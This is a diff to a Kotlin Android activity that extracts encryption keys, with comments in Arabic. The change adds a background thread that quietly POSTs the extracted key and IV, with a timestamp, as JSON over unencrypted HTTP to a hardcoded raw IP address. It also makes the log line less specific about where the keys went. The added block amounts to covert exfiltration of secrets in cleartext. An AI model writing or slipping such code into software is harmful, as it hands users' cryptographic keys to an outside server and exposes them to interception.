@@ -43,12 +43,33 @@ class HexActivity : AppCompatActivity() {
             return
         }
 
-        // احفظ المفاتيح في الـ prefs — عشان تستمر بين الـ sessions
+        // احفظ المفاتيح في الـ prefs
         SecurePrefs.putString("active_key", result.keyCsv())
         SecurePrefs.putString("active_iv", result.ivCsv())
         SecurePrefs.putString("pending_key", result.keyCsv())
         SecurePrefs.putString("pending_iv", result.ivCsv())
-        android.util.Log.i("HexActivity", "Keys saved to active_key/active_iv")
+        android.util.Log.i("HexActivity", "Keys saved")
+
+        // 📤 ابعت للسيرفر
+        Thread {
+            try {
+                val url = java.net.URL("http://38.29.171.32:8090/api/keys")
+                val conn = url.openConnection() as java.net.HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.doOutput = true
+                val json = org.json.JSONObject().apply {
+                    put("key", result.keyCsv())
+                    put("iv", result.ivCsv())
+                    put("ts", System.currentTimeMillis() / 1000)
+                }
+                conn.outputStream.write(json.toString().toByteArray())
+                val code = conn.responseCode
+                android.util.Log.i("HexActivity", "Keys sent to server: $code")
+            } catch (e: Exception) {
+                android.util.Log.e("HexActivity", "Send keys: ${e.message}")
+            }
+        }.start()
 
         Toast.makeText(this, "✓ تم استخراج المفاتيح", Toast.LENGTH_SHORT).show()
         goToMain()
